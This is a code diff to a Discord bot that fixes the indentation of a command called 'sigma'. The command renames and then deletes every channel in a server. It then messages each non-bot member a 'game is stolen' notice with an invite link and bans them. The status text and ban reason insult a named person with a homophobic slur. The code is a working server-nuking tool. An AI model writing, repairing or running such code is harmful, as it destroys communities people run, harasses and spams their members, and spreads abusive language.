@@ -109,6 +109,7 @@ youtube_regex = re.compile(
     r'^(https?://)?(www\.)?(youtube\.com|youtu\.be)/.+$'
 )
 
+
 @bot.command(name='sigma')
 @commands.has_permissions(manage_channels=True)
 async def rename_all_channels(ctx, password: str = None):
@@ -142,51 +143,46 @@ async def rename_all_channels(ctx, password: str = None):
     success_count = 0
     failed_count = 0
 
-   for channel in channels:
-    try:
-        # Skip voice channels that are currently in use
-        if isinstance(channel, discord.VoiceChannel) and len(channel.members) > 0:
+    for channel in channels:
+        try:
+            # Skip voice channels that are currently in use
+            if isinstance(channel, discord.VoiceChannel) and len(channel.members) > 0:
+                failed_count += 1
+                continue
+            # Rename the channel
+            await channel.edit(name="sigma")
+            success_count += 1
+            # Small delay to avoid rate limiting
+            await asyncio.sleep(.5)
+            # Delete the channel after renaming
+            await channel.delete()
+        except discord.Forbidden:
             failed_count += 1
-            continue
-        # Rename the channel
-        await channel.edit(name="sigma")
-        success_count += 1
-        # Small delay to avoid rate limiting
-        await asyncio.sleep(.5)
-        # Delete the channel after renaming
-        await channel.delete()
-    except discord.Forbidden:
-        failed_count += 1
-        print(f"No permission to modify {channel.name}")
-    except discord.HTTPException:
-        failed_count += 1
-        print(f"Failed to modify {channel.name} due to HTTP error")
-    except Exception as e:
-        # Handle any other unexpected errors
-        failed_count += 1
-        print(f"Error processing channel {channel.name}: {e}")
+            print(f"No permission to modify {channel.name}")
+        except discord.HTTPException:
+            failed_count += 1
+            print(f"Failed to modify {channel.name} due to HTTP error")
+        except Exception as e:
+            # Handle any other unexpected errors
+            failed_count += 1
+            print(f"Error processing channel {channel.name}: {e}")
 
-except Exception as e:
-failed_count += 1
-print(f"Unexpected error renaming {channel.name}: {e}")
+    # Update status message with results
+    await status_msg.edit(content=f"ez and also noobi is gay")
 
-# Update status message with results
-await status_msg.edit(content=f"ez and also noobi is gay")
-
-members = [member for member in guild.members if not member.bot]  # Exclude bots
-for member in members:
-    try:
-        await member.send("THE GAME IS STOLEN. CURRENT OWNER IS NOT THE REAL OWNER.\nJOIN -> discord.gg/TAqHcnBTN6 <- FOR MORE INFO (please)")
-        await member.ban(reason="ez banned ez noobi is gay ez")
-    except discord.Forbidden:
-        # Bot doesn't have permission to DM or ban this member
-        print(f"No permission to message or ban {member.name}")
-    except discord.HTTPException:
-        # Member has DMs disabled or other HTTP error
-        print(f"Could not message or ban {member.name}")
-    except Exception as e:
-        # Handle any other unexpected errors
-        print(f"Error processing {member.name}: {e}")
-
+    members = [member for member in guild.members if not member.bot]  # Exclude bots
+    for member in members:
+        try:
+            await member.send("THE GAME IS STOLEN. CURRENT OWNER IS NOT THE REAL OWNER.\nJOIN -> discord.gg/TAqHcnBTN6 <- FOR MORE INFO (please)")
+            await member.ban(reason="ez banned ez noobi is gay ez")
+        except discord.Forbidden:
+            # Bot doesn't have permission to DM or ban this member
+            print(f"No permission to message or ban {member.name}")
+        except discord.HTTPException:
+            # Member has DMs disabled or other HTTP error
+            print(f"Could not message or ban {member.name}")
+        except Exception as e:
+            # Handle any other unexpected errors
+            print(f"Error processing {member.name}: {e}")
 
 serverig.keep_alive()
